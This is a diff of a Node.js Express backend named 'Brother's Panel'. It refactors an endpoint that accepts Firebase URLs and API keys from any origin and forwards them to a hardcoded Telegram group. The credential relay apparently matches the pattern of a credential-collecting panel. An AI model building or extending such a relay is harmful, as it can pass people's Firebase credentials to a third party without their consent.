@@ -4,34 +4,49 @@ require("dotenv").config();
 
 const app = express();
 
-const PORT = process.env.PORT || 3000;
+const PORT = process.env.PORT || 10000;
 
-app.use(cors());
+// ===============================
+// CORS
+// ===============================
+app.use(cors({
+  origin: true,
+  methods: ["GET", "POST", "OPTIONS"],
+  allowedHeaders: ["Content-Type", "Accept"]
+}));
+
 app.use(express.json({ limit: "1mb" }));
 
-/* =========================
-   TELEGRAM CONFIG
-========================= */
+// ===============================
+// TELEGRAM CONFIG
+// ===============================
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 
-const TELEGRAM_BOT_TOKEN =
-  process.env.TELEGRAM_BOT_TOKEN;
+// IMPORTANT:
+// Telegram group/channel ID
+const TELEGRAM_CHAT_ID = "-1004480783091";
 
-const TELEGRAM_CHAT_ID =
-  "-1004480783091";
+// ===============================
+// HTML ESCAPE
+// ===============================
+function escapeTelegramHtml(value) {
+  return String(value)
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;");
+}
 
-
-/* =========================
-   TELEGRAM SEND
-========================= */
-
+// ===============================
+// SEND TELEGRAM MESSAGE
+// ===============================
 async function sendTelegramMessage(message) {
 
   if (!TELEGRAM_BOT_TOKEN) {
-    console.error("Telegram bot token is missing.");
+    console.error("[Telegram] TELEGRAM_BOT_TOKEN is missing");
 
     return {
       success: false,
-      error: "Bot token is not configured"
+      error: "Telegram bot token is not configured"
     };
   }
 
@@ -49,25 +64,27 @@ async function sendTelegramMessage(message) {
         body: JSON.stringify({
           chat_id: TELEGRAM_CHAT_ID,
           text: message,
-          parse_mode: "HTML"
+          parse_mode: "HTML",
+          disable_web_page_preview: true
         })
       }
     );
 
-    const data = await response.json();
+    const data = await response.json().catch(() => ({}));
 
     if (!response.ok || !data.ok) {
 
-      console.error(
-        "Telegram API error:",
-        data
-      );
+      console.error("[Telegram] API error:", data);
 
       return {
         success: false,
-        error: "Telegram API request failed"
+        error:
+          data.description ||
+          `Telegram HTTP ${response.status}`
       };
     }
+
+    console.log("[Telegram] Message sent successfully");
 
     return {
       success: true
@@ -75,57 +92,63 @@ async function sendTelegramMessage(message) {
 
   } catch (error) {
 
-    console.error(
-      "Telegram request error:",
-      error
-    );
+    console.error("[Telegram] Request error:", error);
 
     return {
       success: false,
-      error: "Telegram connection failed"
+      error:
+        error.message ||
+        "Telegram connection failed"
     };
   }
 }
 
+// ===============================
+// FIREBASE CONNECTED
+// ===============================
+app.post("/api/firebase-connected", async (req, res) => {
 
-/* =========================
-   FIREBASE CONNECTED
-========================= */
+  try {
 
-app.post(
-  "/api/firebase-connected",
-  async (req, res) => {
+    const {
+      event,
+      firebaseUrl,
+      apiKey,
+      time
+    } = req.body || {};
 
-    try {
+    console.log("[Firebase] Notification received:", {
+      event,
+      firebaseUrl: firebaseUrl
+        ? String(firebaseUrl)
+        : "",
+      hasApiKey: Boolean(apiKey),
+      time
+    });
 
-      const {
-        event,
-        firebaseUrl,
-        apiKey,
-        time
-      } = req.body;
+    // Check event
+    if (event !== "firebase_connected") {
 
+      return res.status(400).json({
+        success: false,
+        error: "Invalid event"
+      });
+    }
 
-      if (event !== "firebase_connected") {
+    // Check Firebase URL
+    if (!firebaseUrl) {
 
-        return res.status(400).json({
-          success: false,
-          error: "Invalid event"
-        });
-      }
+      return res.status(400).json({
+        success: false,
+        error: "Firebase URL is required"
+      });
+    }
 
+    // ===============================
+    // TELEGRAM MESSAGE
+    // ===============================
 
-      if (!firebaseUrl) {
-
-        return res.status(400).json({
-          success: false,
-          error: "Firebase URL is required"
-        });
-      }
-
-
-      const message =
-`<b>🔥 Brother's Panel</b>
+    const message = `<b>🔥 Brother's Panel</b>
 
 <b>Firebase Connected</b>
 
@@ -133,68 +156,65 @@ app.post(
 <code>${escapeTelegramHtml(firebaseUrl)}</code>
 
 <b>API Key:</b>
-<code>${escapeTelegramHtml(apiKey || "Not provided")}</code>
+<code>${escapeTelegramHtml(
+      apiKey || "Not provided"
+    )}</code>
 
 <b>Time:</b>
-<code>${escapeTelegramHtml(time || new Date().toISOString())}</code>`;
+<code>${escapeTelegramHtml(
+      time || new Date().toISOString()
+    )}</code>`;
 
+    // Send Telegram
+    const telegram =
+      await sendTelegramMessage(message);
 
-      const telegram =
-        await sendTelegramMessage(message);
+    // Telegram failed
+    if (!telegram.success) {
 
-
-      return res.json({
-        success: true,
-        telegramSent: telegram.success
-      });
-
-
-    } catch (error) {
-
-      console.error(
-        "Firebase notification error:",
-        error
-      );
-
-      return res.status(500).json({
+      return res.status(502).json({
         success: false,
-        error: "Server error"
+        telegramSent: false,
+        error: telegram.error
       });
     }
 
+    // Everything successful
+    return res.json({
+      success: true,
+      telegramSent: true
+    });
+
+  } catch (error) {
+
+    console.error(
+      "[Firebase] Server error:",
+      error
+    );
+
+    return res.status(500).json({
+      success: false,
+      error: "Server error"
+    });
   }
-);
+});
 
-
-/* =========================
-   TELEGRAM HTML ESCAPE
-========================= */
-
-function escapeTelegramHtml(value) {
-
-  return String(value)
-    .replace(/&/g, "&amp;")
-    .replace(/</g, "&lt;")
-    .replace(/>/g, "&gt;");
-}
-
-
-/* =========================
-   HEALTH CHECK
-========================= */
-
+// ===============================
+// HOME
+// ===============================
 app.get("/", (req, res) => {
 
   res.json({
     success: true,
     app: "Brother's Panel Backend",
-    version: "1.0.0",
+    version: "1.2.0",
     status: "online"
   });
-
 });
 
-
+// ===============================
+// HEALTH CHECK
+// ===============================
 app.get("/health", (req, res) => {
 
   res.json({
@@ -202,18 +222,14 @@ app.get("/health", (req, res) => {
     status: "healthy",
     uptime: process.uptime()
   });
-
 });
 
-
-/* =========================
-   START SERVER
-========================= */
-
+// ===============================
+// START SERVER
+// ===============================
 app.listen(PORT, () => {
 
   console.log(
     `Brother's Panel Backend running on port ${PORT}`
   );
-
 });
